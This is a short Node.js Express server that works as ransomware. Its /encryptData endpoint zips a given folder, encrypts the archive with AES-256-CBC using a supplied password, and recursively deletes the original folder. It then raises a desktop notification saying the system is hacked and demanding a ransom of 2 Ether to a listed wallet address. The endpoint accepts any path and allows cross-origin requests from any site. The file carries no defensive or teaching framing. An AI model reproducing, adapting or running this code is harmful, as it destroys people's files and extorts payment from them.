const express = require('express');
const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const crypto = require('crypto');
const cors = require('cors');
const notifier = require('node-notifier');

require('dotenv').config(); 

const app = express();
const port = 3002;


app.use(cors());

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/encryptData', (req, res) => {

  const folderPath = req.body.folderPath;
  const password = req.body.password;

const folderName = path.basename(folderPath);

// Remove the folder name from the path
const parentPath = path.dirname(folderPath);


// Step 1: Create an output stream for the zip file
const zipFileName = `${folderName}.zip`;
const zipPath = path.join(`${parentPath}`, zipFileName); // In the Desktop path
const outputZip = fs.createWriteStream(zipPath);

// Step 2: Create a zip archive and pipe it to the output stream
const archive = archiver('zip', { zlib: { level: 9 } });
archive.directory(folderPath, false);
archive.pipe(outputZip);

outputZip.on('close', async () => {
  console.log(`Folder zipped successfully: ${zipPath}`);

  // Step 3: Read the zip file
  const zipBuffer = fs.readFileSync(zipPath);

  // Step 4: Encrypt the zip file
  const cipher = crypto.createCipher('aes-256-cbc', password);
  const encryptedBuffer = Buffer.concat([cipher.update(zipBuffer), cipher.final()]);

  // Step 5: Write the encrypted data back to the original zip file
  fs.writeFileSync(zipPath, encryptedBuffer);

  // Step 6: Cleanup - delete the original folder
  fs.rmdirSync(folderPath, { recursive: true });

  console.log('Folder zipped, encrypted, and original folder replaced successfully.');
  res.send('Success');
  await showEncryptionNotification();
});

archive.finalize(); // This triggers the zip archive to close

});


async function showEncryptionNotification() {
  notifier.notify({
    title: 'Your System is Hacked!!! and Datas are Encrypted',
    message: `Pay Ransom of 2 Ethers to my Address : 0x9AC9516d75bb7B82D57aE56c78354280c454eB1a to get your Data Back`,
   
  });
}


app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});